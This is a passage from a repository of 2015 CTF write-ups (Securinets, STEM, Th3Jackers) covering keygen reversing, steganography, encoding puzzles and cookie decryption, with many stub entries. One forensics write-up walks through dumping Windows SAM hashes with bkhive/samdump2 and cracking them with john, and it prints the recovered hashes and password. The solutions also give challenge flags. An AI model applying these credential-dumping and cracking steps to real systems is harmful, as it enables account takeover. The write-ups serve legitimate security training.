012411BB   . 3D 9B000000    CMP EAX,9B
012411C0   . 0F85 DB000000  JNZ rev.012412A1
```
Here, we know that our letter + 0x42 = 0x9b, so 0x9b - 0x42 is our char : 'Y'
This char is the last char of the key as it must be at the 16th position
(`EBP-231`)

Math are pretty much that simple for the remainder of the code. The most
"tricky" part is when one value is computed based on another key value like this :

``` nasm
012411ED   . 0FBE8D C2FDFFF>MOVSX ECX,BYTE PTR SS:[EBP-23E]
012411F4   . 8D41 01        LEA EAX,DWORD PTR DS:[ECX+1]
012411F7   . 83F8 3A        CMP EAX,3A
012411FA   . 0F85 A1000000  JNZ rev.012412A1
01241200   . 0FBE85 CDFDFFF>MOVSX EAX,BYTE PTR SS:[EBP-233]
01241207   . 03C1           ADD EAX,ECX
01241209   . 3D 9B000000    CMP EAX,9B
0124120E   . 0F85 8D000000  JNZ rev.012412A1
```

So, on line `012411ED`, the 3rd char (`EBP-23E`) is moved into ECX register.
What we're looking at right now, is at address `01241200` and the followings.
The 14th char (`EBP-233`) must be: our char + ECX = 0x9b.
So we have to take our 3rd char computed just before and substract it from 0x9b
and we get our char. That's pretty much the trickiest arithmetic we have to do.

I did all the math by hand and wrote that python script to print the key from the hex values :

``` py
#!/usr/bin/env python3

key = [0x42,  0x5a, 0x39, 0x64, 0x6d, 0x71, 0x34, 0x63, 0x38, 0x67, 0x39, 0x47, 0x37, 0x62, 0x41, 0x59]

for c in key:
    print(chr(c), end='')

```

The key is : BZ9dmq4c8g9G7bAY

## Other write-ups and resources

* <http://maroueneboubakri.ctf.tn/securinets-ctf-2015-quals-re250-task-writeup/>
# Securinets Quals CTF 2015: Card Games (Jeux de cartes)

**Category:** Crypto
**Points:** Card Games
**Solves:** 
**Description:** 

> Hint : No hint
>
> url : [http://41.231.22.133:8020/1/index.docx](index.docx)

## Write-up

(TODO)

## Other write-ups and resources

* none yet# Securinets Quals CTF 2015: Decrypt me (Décrypte moi)

**Category:** Crypto
**Points:** 125
**Solves:** TODO
**Description:** 

> Hint : The hint is in French (La ... des étoiles) 
>
> url : [http://41.231.22.133:8020/3/french.docx](french.docx)

## Write-up

(TODO)

## Other write-ups and resources

* none yet# Securinets Quals CTF 2015: Matrix everywhere (Des matrices partout)

**Category:** Crypto
**Points:** 100
**Solves:** TODO
**Description:** 

> Hint : Compatible Operation (Opération compatible) 
>
> url : [http://41.231.22.133:8020/2/matrices.docx](matrices.docx)

## Write-up

(TODO)

## Other write-ups and resources

* <http://ipushino.blogspot.de/2015/03/securinets-ctf-2015-cryptomatrix.html># Securinets Quals CTF 2015: Document

**Category:** Forensics
**Points:** 150
**Solves:** TODO
**Description:** 

> Hint : no hint (aucun hint)
>
> url : [http://41.231.22.133:8080/1/doc_forensics.docx](doc_forensics.docx)
> 

## Write-up

by [shikata-ga-nai](https://github.com/shikata-ga-nai)

We are given with file, which we can discover with Unix "file" command, happens to be RAR archive. Firstly we unrar it. We get a folder with 3 folders and 1 file inside. Folders: word, docProps, customXml. File: [Content_Types].xml. Word folder gives us a clue that it might be a word document, which is basically a zipped archive of mentioned folders and that file above. Thus, we zip-archive the folder and give it .docx extension. After that we can open the file, for example, in Google Drive (https://docs.google.com/document/d/1aV4tQvcVd6BULTrHQpE-JiJG57KAFG9NVku7K2oReZI)  and get the flag. 
 Flag= D3_R13N_ChA113Ng3R_

## Other write-ups and resources

* none yet
# Securinets Quals CTF 2015: Forensics2

**Category:** Forensics
**Points:** 200
**Solves:** TODO
**Description:** 

> Hint : ALYSSA's account (Compte de ALYSSA) 
>
> url : [http://41.231.22.133:8080/2/forensics.rar](forensics.rar)

## Write-up

by [polym](https://github.com/abpolym)

We are given a rar that we extract to find two files, `SAM` and `SYSTEM`:

```bash
+bash-4.3$ unrar x forensics.rar 

UNRAR 5.21 freeware      Copyright (c) 1993-2015 Alexander Roshal


Extracting from forensics.rar

Creating    forensics                                                 OK
Extracting  forensics/SAM                                             OK 
Extracting  forensics/SYSTEM                                          OK 
All OK
```

Both files are from the `Windows Registry` database (see [wiki](https://en.wikipedia.org/wiki/Windows_Registry)).

While `SAM` ([Security Account Manager](https://en.wikipedia.org/wiki/Security_Account_Manager)) contains usernames and passwords, `SYSTEM` also contains a system bootkey to encrypt and decrypt [SAM password hashes](ftp://distro.ibiblio.org/openwall/passwords/pwdump/syskey.txt).

On Linux, we can use `bkhive` and `samdump2` to recover the password files with decrypted [LM and NTLM hashes](http://openwall.info/wiki/john/hash-formats).

First, we use `bkhive` on `SYSTEM` to recover the bootkey `bootkey`:

```bash
$ bkhive SYSTEM bootkey
bkhive 1.1.1 by Objectif Securite
http://www.objectif-securite.ch
original author: ncuomo@studenti.unina.it

Root Key : CMI-CreateHive{F10156BE-0E87-4EFB-969E-5DA29D131144}
Default ControlSet: 001
Bootkey: 5b851e0b74d0f3c73519e18d9cb76a2b
```

Now, we can use `samdump2` on `SAM` using the `bootkey` to get [the password file](./windows-passwd.txt) containing our hashes:

```bash
$ samdump2 SAM bootkey > windows-passwd.txt
```

The passwords are stored in the second hashes row, containing NTLM hashes.

We have several options to crack these hashes - In this writeup I'll choose two - `john`, [Jumbo version](http://www.openwall.com/john/), and [an online hash database](https://hashkiller.co.uk/ntlm-decrypter.aspx).

The former in combination with a wordlist attack using the rockyou wordlist dictionary accomplishes to crack three hashes:

```bash
$ john --format=NT --wordlist=./rockyou.txt windows-passwd.txt 
Loaded 5 password hashes with no different salts (NT [MD4 128/128 X2 SSE2-16])
Remaining 3 password hashes with no different salts
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:02 DONE (2015-12-27 15:00) 0g/s 5625Kp/s 5625Kc/s 16875KC/s             ..*7¡Vamos!
Session completed

6 password hashes cracked, 0 left

$ john --show --format=NT windows-passwd.txt                                                                                                                                           
Administrateur::500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Invit:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
admin:hahaha:1003:aad3b435b51404eeaad3b435b51404ee:dfac230e99c5e6bb79e25668712d66b9:::

3 password hashes cracked, 3 left
```

Side-note: I guess it says `6 passwords hashes cracked`, because it also cracked 6 out of 6 LM hashes (which are all the same `aad3b435b51404eeaad3b435b51404ee` for the string `no password` (see [here](https://www.felixrr.pro/archives/339/what-is-aad3b435b51404eeaad3b435b51404ee)).

Using the latter option, we crack two out of six hashes:

![](hashkiller.png)

The flag is the password for the user `admin`, namely `hahaha`.

## Other write-ups and resources

* <http://ipushino.blogspot.de/2015/03/securinets-ctf-2015-forensics-forensics2.html># Securinets Quals CTF 2015: Hidden1

**Category:** Hidden
**Points:** 50
**Solves:** TODO
**Description:** 

> Hint : no hint (aucun hint) 
> url : 

## Write-up

(TODO)

## Other write-ups and resources

* none yet# Securinets Quals CTF 2015: Logic1

**Category:** Logic
**Points:** 100
**Solves:** TODO
**Description:** 

> Hint : Mathematics (Mathématiques) 
>
> url : [http://41.231.22.133:8060/1/math.docx](math.docx)

## Write-up

(TODO)

## Other write-ups and resources

* <http://ipushino.blogspot.de/2015/03/securinets-ctf-2015-logic1.html># Securinets Quals CTF 2015: Be Genious

**Category:** Programming
**Points:** 400
**Solves:** TODO
**Description:** 

> Hint : 41.231.22.136 5555 
> url :

## Write-up

(TODO)

## Other write-ups and resources

* <https://rezk2ll.wordpress.com/2015/03/24/securinets-quals-ctf-2015-be-genious-write-up/># Securinets Quals CTF 2015: Dos Attack (Attaque Dos)

**Category:** Programming
**Points:** 200
**Solves:** TODO
**Description:** 

> Hint : Bot 
>
> url : http://41.231.22.133:8070/1/

## Write-up

(TODO)

## Other write-ups and resources

* none yet# Securinets Quals CTF write-ups

* <http://www.ctfsecurinets.com/>
* [Scoreboard](https://41.231.22.132/app.php/login) or [local alternative](scoreboard.txt)

## Completed write-ups

* [crack/reverse](crack/reverse)
* [forensics/document](forensics/document)
* [forensics/forensics2](forensics/forensics2)
* [stegano/basics](stegano/basics)
* [stegano/broken](stegano/broken)
* [stegano/google](stegano/google)
* [web/cookies](web/cookies)

## External write-ups only

* [crack/crack1](crack/crack1)
* [crypto/matrix-everywhere](crypto/matrix-everywhere)
* [logic/logic1](logic/logic1)
* [programming/be-genious](programming/be-genious)

## Missing write-ups

* [crypto/card-games](crypto/card-games)
* [crypto/decrypt-me](crypto/decrypt-me)
* [hidden/hidden1](hidden/hidden1)
* [programming/dos-attack](programming/dos-attack)
* [recon/recon1](recon/recon1)
* [reseau/account-disabled](reseau/account-disabled)
* [web/admin-banned](web/admin-banned)
* [web/lock](web/lock)# Securinets Quals CTF 2015: Recon1

**Category:** Recon
**Points:** 80
**Solves:** TODO
**Description:** 

> Hint : It's not Stegano (Ce n'est pas du Stegano) 
>
> url : [http://41.231..22.133:8110/1/pix3.png](pix3.png)

## Write-up

(TODO)

## Other write-ups and resources

* none yet# Securinets Quals CTF 2015: Account disabled (compte désactivé)

**Category:** Reseau
**Points:** 100
**Solves:** TODO
**Description:** 

> Hint : no hint (aucun hint) 
>
> url : http://41.231.22.133:8050/1/

## Write-up

(TODO)

## Other write-ups and resources

* none yet# Securinets Quals CTF 2015: Basics (Basique)

**Category:** Stegano
**Points:** 25
**Solves:** TODO
**Description:** 

> Hint : no hint (aucun hint) 
>
> url : [http://41.231.22.133:8030/3/steg.png](steg.png)

## Write-up

by [polym](https://github.com/abpolym)

We are given a PNG file:

![](./steg.png)

Using `stegsolve`, we find the flag in the gray bits panel of the image:

![](./stegsolve.png)

The flag is `L1nux3rr0r`.

## Other write-ups and resources

* <http://ipushino.blogspot.de/2015/03/securinets-ctf-2015-stegano-basics.html># Securinets Quals CTF 2015: Broken

**Category:** Stegano
**Points:** 100
**Solves:** TODO
**Description:** 

> Hint : no hint (aucun hint) 
>
> url : [http://41.231.22.133:8030/2/Broken.jpg](Broken.jpg)

## Write-up

by [polym](https://github.com/abpolym)

We are given a ''broken'' QR code:

![](Broken.jpg)

This task is rather easy. All we have to do is invert the picture using `convert -negate Broken.jpg Broken-inv.jpg` and submit the ''broken'' QR code to an [online QR decoder](https://zxing.org/w/decode.jspx).

Though it is broken, it works, since the missing parts are only necessary for aligning the picture.

The flag is `1t_S_s0_cr3atIv3`.

## Other write-ups and resources

* <http://ipushino.blogspot.de/2015/03/securinets-ctf-2015-stegano-broken.html>
* [Korean](http://blog.naver.com/hy00un__/220306608668)# Securinets Quals CTF 2015: Google

**Category:** Stegano
**Points:** 150
**Solves:** TODO
**Description:** 

> Hint : Useless to google it (Inutile de googler) 
>
> url : [http://41.231.22.133:8030/1/google.png](google.png)

## Write-up

by [polym](https://github.com/abpolym)

This write-up is loosely based on a writeup by [ipushino](http://ipushino.blogspot.de/2015/03/securinets-ctf-2015-stegano-google.html).

We are given a PNG that display the Google Home Page:

![](./google.png)

At closer look, we notice some magenta (made out of mixing blue and red values) dots.

We use the [pixels.py](./pixels.py) tool in combination with `grep` to find magenta pixels:

```bash
+bash4.3$ python2.7 ./pixels.py google.png | grep -E '[0-9]+ 0 [0-9]+ [0-9]+'
255 0 112 255
255 0 121 255
255 0 110 255
255 0 53 255
255 0 116 255
255 0 50 255
255 0 49 255
255 0 104 255
255 0 111 255
255 0 48 255
```

The blue values look like they could be represented in ASCII, so let's do exactly that:

```
+bash4.3$ python2.7 ./pixels,py grep -E '255 0 [0-9]+' | awk '{print $3}' | while read d; do printf $(printf '\%o' "$d"); done && echo
pyn5t21ho0
```

This is not the correct flag, but by reordering the alpha-numerical characters we can get `python2015`, which is the flag!

## Other write-ups and resources

* <http://ipushino.blogspot.de/2015/03/securinets-ctf-2015-stegano-google.html># Securinets Quals CTF 2015: Admin Banned

**Category:** Web
**Points:** 100
**Solves:** TODO
**Description:** 

> Hint : HTML 
>
> url : http://41.231.22.133:8010/3/

## Write-up

(TODO)

## Other write-ups and resources

* none yet# Securinets Quals CTF 2015: Cookies

**Category:** Web
**Points:** 50
**Solves:** TODO
**Description:** 

> Hint : Cookie special forces (Les forces spéciales des cookies) 
>
> url : http://41.231.22.133:8010/1/

## Write-up

by [polym](https://github.com/abpolym)

We look at out cookies and see several cookies of similar length and one cookie that does stand out:

![](cookies.png)

Looking at the [jsencryption.js](./41.231.22.133-8010/1/jsencryption.js), we see that the backend uses the [Gibberish AES](http://github.com/markpercival/gibberish-aes/tree/master) encryption to encrypt the cookies.

[There](https://github.com/mdp/gibberish-aes), we see that we can decrypt these cookies using `openssl` using the [found key](./41.231.22.133-8010/1/index.html) "salt":

```bash
$ echo "U2FsdGVkX1+TN5FVhjKHx/aPykKiXhr7l5Bf2ffza2mAZAgl3UkaxhHv2a9umyGT" | openssl enc -d -aes-256-cbc -a -k salt
flag=NaiMuS_2OI5
```

The flag is `NaiMuS_2OI5`.

## Other write-ups and resources

* <https://rezk2ll.wordpress.com/2015/03/24/securinets-quals-ctf-2015-cookies-write-up/># Securinets Quals CTF 2015: Lock

**Category:** Web
**Points:** 200
**Solves:** TODO
**Description:** 

> Hint : no hint (aucun hint) 
>
> url : http://41.231.22.133:8010/2/

## Write-up

(TODO)

## Other write-ups and resources

* none yet# STEM CTF 2015: cyberville-500

**Category:**
**Points:**
**Solves:**
**Description:**

> “You operate in the darkness. Make the world safe… in the shadows.”
> [firmware-upgrade.pcapng](firmware-upgrade.zip)
> [trojan_firmware.bin](trojan_firmware.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://0x90r00t.com/2015/09/15/mitre-stem-2015-cyberville-500-write-up/> 
# STEM CTF 2015: doctor-message-300

**Category:** 
**Points:** 
**Solves:** 
**Description:**

> ![](messsage_from_the_doctor.png)


## Write-up

(TODO)

## Other write-ups and resources

* <http://tqk.pw/ctf/writeup/2015/09/13/some-easy-writeup-for-mitrectf-2015/#crypto-300---doctor-message> 
# STEM CTF 2015: gravity-falls-100

**Category:**
**Points:**
**Solves:**
**Description:**

> ![](message.png)

## Write-up

(TODO)

## Other write-ups and resources

* <http://tqk.pw/ctf/writeup/2015/09/13/some-easy-writeup-for-mitrectf-2015/#crypto-100---message>
* <https://0x90r00t.com/2015/09/14/mitre-stem-2015-crypto-100-gravity-falls-write-up/>
# STEM CTF 2015: holy-krabby-patty-mermaid-man-50

**Category:**
**Points:**
**Solves:**
**Description:**

> Oh no! Mermaid Man has left his belt at the Krusty Krab. You fully intend to return the belt to him, but first you want to enjoy a Ceaser Salad. Because you don’t want to get any food on the belt, you set it next to you. After finishing the salad, you notice that the belt is now gone and replaced with a note. What does the note say?
>
> C qogvi. Sio qogvi. By- mby- gy… qogvi. Qogvi; Qogvicha; Qy’ff bupy nbyy qogvi; Qogvilugu; Qogvifias; nby mnoxs iz Qogvi. Cn’m zclmn aluxy, Mjihayviv! GWU-UW56X5YU


## Write-up

(TODO)

## Other write-ups and resources

* <http://tqk.pw/ctf/writeup/2015/09/13/some-easy-writeup-for-mitrectf-2015/#crypto-50>
* <https://0x90r00t.com/2015/09/14/mitre-stem-2015-crypto-50-holy-krabby-patty-mermaid-man-write-up/>
# STEM CTF 2015 CTF write-ups

* <http://ctf.mitrecyberacademy.org/>
* [Scoreboard (college)](http://mitrecyberacademy.org/competitions/september-2015-college/), [Scoreboard high school](http://mitrecyberacademy.org/competitions/september-2015-hs/) or [local alternative collge](TODOLOCAL), [local alternative high school](TODOLOCAL)

## Completed write-ups

* none yet

## External write-ups only

* [cyberville-500](cyberville-500)
* [doctor-message-300](doctor-message-300)
* [gravity-falls-100](gravity-falls-100)
* [holy-krabby-patty-mermaid-man-50](holy-krabby-patty-mermaid-man-50)
* [scramble-100](scramble-100)
# STEM CTF 2015: scramble-100

**Category:** 
**Points:** 
**Solves:** 
**Description:**

> ![](scramble.png)


## Write-up

(TODO)

## Other write-ups and resources

* <http://tqk.pw/ctf/writeup/2015/09/13/some-easy-writeup-for-mitrectf-2015/#crypto-100---srcamble> 
# Th3Jackers CTF 2015: OHSHIT

**Category:** Crypto
**Points:** 100
**Solves** 49
**Description:**

> Description: Decrypt the cipher using the encryption program
>
> Attachment: [53036532009087f6faf540c84b32dace](53036532009087f6faf540c84b32dace)

## Write-up

by [polym](https://github.com/abpolym)

We are given a binary and a Readme, called [crypto.txt](crypto.txt) and are instructed to use the binary to decode the message:

> 019t-0-080-3-1b-19t-25z-080-03f-8j-1b-12n-12n

We first call crypto without any parameters:

```
$ ./crypto
Enter the fucking argument
```

So we enter a parameter `a` and see, that the output is the decrypted character sequence for this char:

```
$ ./crypto a
Crypted text: 1b
```

Because this matches one of our encode character sequences, we will run the binary with every lower/uppercase character as well as number and special character we can think of:

```
for i in {{A..z},{0..9},.}; do echo -n "[$i]: "; ./crypto $i; done
```

The resulting coding table is [here](decode).

We are decoding the given ciphertext `019t-0-080-3-1b-19t-25z-080-03f-8j-1b-12n-12` using the coding table and get `S-0-.-3-a-s-y-.-c-h-a-l-l`.

Removing all dashes (`-`) and we get the flag: `flag{S0.3asy.chall}`

## Other write-ups and resources

* <http://0xa.li/th3jackers-2015-ctf-crypto100-writeup/>
* <https://ctf-team.vulnhub.com/th3jackers-2015-crypto100/>
# Th3Jackers CTF 2015: The last word

**Category:** Crypto
**Points:** 200
**Solves** 10
**Description:**

> Description: Decrypt this
>
> Attachment: [7ef605fc8dba5425d6965fbd4c8fbe1f](7ef605fc8dba5425d6965fbd4c8fbe1f)

## Write-up

(TODO)

## Other write-ups and resources

* <http://0xa.li/th3jackers-2015-ctf-crypto200-writeup/>
# Th3Jackers CTF 2015: Break\_Me

**Category:** Crypto
**Points:** 300
**Solves** 11
**Description:**

> Description: open your eyes in the end
>
> Attachment: [8a6eb7f9aa2b6bcd8d5407fd3dab3127.tar.gz](8a6eb7f9aa2b6bcd8d5407fd3dab3127.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://maltekraus.de/blog/ctf/english/2015/01/24/th3jackers.html>
* <http://blog.randomguys.fr/th3jackers2015-crypto300.html>
# Th3Jackers CTF 2015: Find my secret

**Category:** Forensics
**Points:** 200
**Solves** 3
**Description:**

>Description: We have found a memory dump of a NSA worker, it may contain a secret information aboute NSA.find the secret and get the flag.
> 
> Attachment: [bd087d91e8c4f74f617086d78870f231](https://mega.nz/#!mEl1zDwL!ZTFzm7T6FHEkRcaeiHwfmv6oi8olaBM8GKQL9buEvJc)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Th3Jackers CTF 2015: Weird Text

**Category:** Misc
**Points:** 100
**Solves** 32
**Description:**

> Description: Giv m th flg plz !
>
> Attachment: [ec5883451bb7d0aa6b5950e39ed5f16d](ec5883451bb7d0aa6b5950e39ed5f16d)

## Write-up

by [polym](https://github.com/abpolym)

We are given [this textfile](ec5883451bb7d0aa6b5950e39ed5f16d), consisting of blank newlines, lines containing a specific number of underscores (`_`) and lines with a lone character.

After noticing that four underscore lines preceding the `{` symbol might match `flag`, we are convinced that the number of underscores of each line represent a character.

Therefore, we can decode the given ciphertext using this command:

```
$ cat ec5883451bb7d0aa6b5950e39ed5f16d | while read line; do [[ $line =~ '_' ]] && printf \\$(printf "%o" $((${#line}+96))) || echo -n $line; done
thisizjus7ali77lej0k3;)flag{g1v3-m3-th4-flag}
```

## Other write-ups and resources

* <http://0xa.li/th3jackers-2015-ctf-misc100-writeup/>
* <https://ctf-team.vulnhub.com/the3jackers-2015-misc100/>
# Th3Jackers CTF 2015: Introduction to Keylogging

**Category:** Misc
**Points:** 50
**Solves** 14
**Description:**

> Description: WTF ?: ^[[1;3Aload+^[[1;3Bload+^[[1;3C+here+^[[1;3D4dead
>
> Attachment:

## Write-up

by [polym](https://github.com/abpolym)

We have to decode the message `^[[1;3Aload+^[[1;3Bload+^[[1;3C+here+^[[1;3D4dead`.

First, we have to know that these weird-looking character sequences `^[[1;3A` are keycodes:

| Keycode  |      Meaning  |
|----------|:-------------:|
| [[1;3A | M-Up  |
| [[1;3B | M-Down  |
| [[1;3C | M-Right  |
| [[1;3D | M-Left  |

If we substitute the meaning of each keycode with the keycode in the message and leave out the preceding `M-`, we are getting this cleartext:

`upload+download+right+here+left4dead`

This results in the correct flag: `flag{upload+download+right+here+left4dead}`

## Other write-ups and resources

* <http://0xa.li/th3jackers-2015-ctf-misc50-writeup/>
# Th3Jackers CTF 2015 write-ups

* <http://ctf.th3jackers.com>
* [Unofficial Scoreboard](scoreboard)

## Completed write-ups

* [crypto/cry100](crypto/cry100)
* [misc/misc100](misc/misc100)
* [misc/misc50](misc/misc50)
* [stegano/steg100](stegano/steg100)
* [stegano/steg200](stegano/steg200)
* [stegano/steg300](stegano/steg300)
* [trivia/trivia150](trivia/trivia150)
* [trivia/trivia200](trivia/trivia200)
* [trivia/trivia50](trivia/trivia50)
* [web/web300](web/web300)

## External write-ups only

* [crypto/cry200](crypto/cry200)
* [crypto/cry300](crypto/cry300)
* [reverse/rev100](reverse/rev100)

## Missing write-ups

* [forensics/for200](forensics/for200)
* [reverse/rev200](reverse/rev200)
* [reverse/rev300](reverse/rev300)
* [web/web200](web/web200)# Th3Jackers CTF 2015: reverse100

**Category:** Reverse
**Points:** 100
**Solves** 26
**Description:**

> Description: Just go and check if you have the right flag!!!
>
> Attachment: [01f47d58806a8264cd4b2b97b9dabb4a](01f47d58806a8264cd4b2b97b9dabb4a)

## Write-up

(TODO)

## Other write-ups and resources

* <https://maltekraus.de/blog/ctf/english/2015/01/24/th3jackers.html>
* <http://0x1337seichi.wordpress.com/2015/01/26/wctf-th3jackers-rev100-writeup/>
# Th3Jackers CTF 2015: reverse200

**Category:** Reverse
**Points:** 200
**Solves** 9
**Description:**

> Description: Muhammad lost his Serial Number, can you get it for him?\_\_\_\_\_\__\_\_\_\_\_ flag{XXXX-XXXXXX-XXXXXX-XXXX}
>
> Attachment: [15f400a109c71a5152ef9531de45d46e](15f400a109c71a5152ef9531de45d46e)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Th3Jackers CTF 2015: reverse300

**Category:** Reverse
**Points:** 300
**Solves** 16
**Description:**

> Description: Fix me First
>
> Attachment: [1566ffe1f44072cad600fc29a1320ec4](1566ffe1f44072cad600fc29a1320ec4)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Th3Jackers CTF 2015: Easy stegano

**Category:** Stegano
**Points:** 100
**Solves** 17
**Description:**

> Description: easy to slove
>
> Attachment: [d30b7599498d0e8cf28f2cd9a7c9b9ba](d30b7599498d0e8cf28f2cd9a7c9b9ba)

## Write-up

by [polym](https://github.com/abpolym)

This write-up is based on a write-up by [ctf-team](https://ctf-team.vulnhub.com/the3jackers-2015-steg100/).

Using the `file` command, we see that we are given a JPG.

Neither `binwalk` nor `foremost` detect any additional files hidden in the JPG, so we open the JPG with a hexeditor.

We search for the footer signature of the JPG, which is always `FFD9` in hexadecimal and find additional data after the JPG officially ends:

![](./extra-data.png)

This data says `K="KhtgduHjj"Guess?`, which is a hint to the `outguess` steganography program. `K="KhtgduHjj"` means that the password (or `K`ey) is `KhtgduHjj`.

Applying `outguess` on the JPG yields something interesting:

```bash
+bash-4.3$ outguess -k KhtgduHjj -r d30b7599498d0e8cf28f2cd9a7c9b9ba out.txt
Unknown data type of d30b7599498d0e8cf28f2cd9a7c9b9ba
+bash-4.3$ mv d30b7599498d0e8cf28f2cd9a7c9b9ba{,.jpg}
+bash-4.3$ outguess -k KhtgduHjj -r d30b7599498d0e8cf28f2cd9a7c9b9ba.jpg out.txt
Reading d30b7599498d0e8cf28f2cd9a7c9b9ba.jpg....
Extracting usable bits:   40455 bits
Steg retrieve: seed: 146, len: 33
+bash-4.3$ cat out.txt 
Jbhun_Hlbh_S0HhaQ_GU3_SyNnt0K_==
+bash-4.3$ cat out.txt  | base64 --decode | phd
00000000  25 b8 6e 9f  f1 e5 6e 1f  d2 d0 78 5a  43 f1 94 df  │%·n·│··n·│··xZ│C···│
00000010  f4 b2 36 7b  74 2b                                  │··6{│t+│
00000016
```

The base64 encoding is a red herring and we just have to apply rot13 to it to get the flag:

```bash
+bash-4.3$ python -c 'print "Jbhun_Hlbh_S0HhaQ_GU3_SyNnt0K_==".encode("rot13")'
Wouha_Uyou_F0UunD_TH3_FlAag0X_==
```

The flag is `Wouha_Uyou_F0UunD_TH3_FlAag0X_==`.

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/the3jackers-2015-steg100/>
* [Persian](http://nevermore.blog.ir/post/th3jackers-2015-CTF-writeup)
# Th3Jackers CTF 2015: Private Eyes

**Category:** Stegano
**Points:** 200
**Solves** 8
**Description:**

> Description: é_é
>
> Attachment: [0227597b75da424e4233f8b3c1873446](0227597b75da424e4233f8b3c1873446)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on a writeup by [this persian writeup](http://nevermore.blog.ir/post/th3jackers-2015-CTF-writeup).

By running `file 0227597b75da424e4233f8b3c1873446`, we see that we are given a JPG, which shows several pictures of arrows, QR codes, numbers etc in small tiles:

![](./0227597b75da424e4233f8b3c1873446)

Applying `exiftool`, `binwalk` or any steganography tools to it, we can't see anything suspicious hidden inside the JPG.

The QR codes and the transparent QR code background seem to be decoys (red herrings) that we have to ignore.

The solution to this problem is a ''hidden'' base64 code in these tiles:

![](tiles.png)

The base64 string is `ZmxhZ3tuIWNldHJ5fQ98=`, which decoded gives us the flag:

```bash
+bash-4.3$ base64 --decode <<< 'ZmxhZ3tuIWNldHJ5fQ98=' | xxd
0000000: 666c 6167 7b6e 2163 6574 7279 7d0f 7c    flag{n!cetry}.|
```

The flag is `flag{n!cetry}`.

PS: The file name is md5(hellobitch). So nice...

## Other write-ups and resources

* [Persian](http://nevermore.blog.ir/post/th3jackers-2015-CTF-writeup)
# Th3Jackers CTF 2015: Ultimate Steg

**Category:** Stegano
**Points:** 300
**Solves** 8
**Description:**

> Description: A key is Hidden within this file, Find it and get the f\*\*kin' flag
>
> Attachment: [61b94d373df24a669390bf5cc31090ac](61b94d373df24a669390bf5cc31090ac)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on a writeup by [bannsecurity](http://bannsecurity.com/index.php/home/10-ctf-writeups/25-th3jackers-ctf-2015-ultimate-steg).

We are given a gif:

![](61b94d373df24a669390bf5cc31090ac)

Using `binwalk`, we see that it contains a zip containing several other pictures in `jpg` and `png` format:

```bash
$ binwalk 61b94d373df24a669390bf5cc31090ac | igrep -v Zlib
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             GIF image data, version "89a", 189 x 188
77499         0x12EBB         Zip archive data, at least v2.0 to extract, compressed size: 71435,  uncompressed size: 71543, name: "1.png"
148969        0x245E9         Zip archive data, at least v2.0 to extract, compressed size: 2720,  uncompressed size: 2880, name: "2.jpg"
151724        0x250AC         Zip archive data, at least v2.0 to extract, compressed size: 13980,  uncompressed size: 101684, name: "3.jpg"
165739        0x2876B         Zip archive data, at least v2.0 to extract, compressed size: 6875,  uncompressed size: 7019, name: "4.jpg"
172649        0x2A269         Zip archive data, at least v2.0 to extract, compressed size: 20250,  uncompressed size: 21072, name: "5.jpg"
192934        0x2F1A6         Zip archive data, at least v2.0 to extract, compressed size: 3552,  uncompressed size: 3693, name: "6.jpg"
196521        0x2FFA9         Zip archive data, at least v1.0 to extract, compressed size: 947,  uncompressed size: 947, name: "strange_file.png"
197882        0x304FA         End of Zip archive
```

We extract the zip using `foremost`:

```bash
$ foremost 61b94d373df24a669390bf5cc31090ac
$ tree output
output/
├── audit.txt
├── gif
│   └── 00000000.gif
└── zip
    └── 00000151.zip

2 directories, 3 files
$ 7z x 00000151.zip -oout
$ cd out
$ ls -1
1.png
2.jpg
3.jpg
4.jpg
5.jpg
6.jpg
strange_file.png
$ file *
1.png:            PNG image data, 187 x 186, 8-bit/color RGB, non-interlaced
2.jpg:            JPEG image data, JFIF standard 1.01
3.jpg:            JPEG image data, JFIF standard 1.01, comment: "CREATOR: gd-jpeg v1.0 (using IJ"
4.jpg:            JPEG image data, JFIF standard 1.01
5.jpg:            JPEG image data, JFIF standard 1.01
6.jpg:            JPEG image data, JFIF standard 1.01, comment: "CREATOR: gd-jpeg v1.0 (using IJ"
strange_file.png: data
```

The first picture `1.png` has trailing data (`3tKdX`):

![](./trailing.png)

The second picture `2.jpg` tells us to use another method:

![](./trailing2.png)

We have to apply `outguess` on `2.jpg` to receive another hidden message (`N0LWF`):

```bash
$ outguess -r 2.jpg 2txt
Reading 2.jpg....
Extracting usable bits:   2315 bits
Steg retrieve: seed: 32, len: 16
$ cat 2txt
N0LWF
Dont stop
```

The third picture `3.jpg` seems to contain a lot of Zip archive data, which we again extract using `foremost`:

```bash
$ binwalk 3.jpg
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard  1.01
7877          0x1EC5          Zip archive data, at least v1.0 to extract, compressed size: 12,  uncompressed size: 12, name: "0"
7920          0x1EF0          Zip archive data, at least v1.0 to extract, compressed size: 12,  uncompressed size: 12, name: "1"
7963          0x1F1B          Zip archive data, at least v1.0 to extract, compressed size: 12,  uncompressed size: 12, name: "10"
[...]
52632         0xCD98          Zip archive data, at least v1.0 to extract, compressed size: 12,  uncompressed size: 12, name: "997"
52677         0xCDC5          Zip archive data, at least v1.0 to extract, compressed size: 12,  uncompressed size: 12, name: "998"
52722         0xCDF2          Zip archive data, at least v1.0 to extract, compressed size: 12,  uncompressed size: 12, name: "999"
101657        0x18D19         End of Zip archive
$ foremost 3.jpg
Processing: 3.jpg
|*|
$ tree output/
output/
├── audit.txt
├── jpg
│   └── 00000000.jpg
└── zip
    └── 00000015.zip

2 directories, 3 files
$ cd output/zip
$ 7z x 00000015.zip -oout

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,8 CPUs)

Processing archive: 00000015.zip

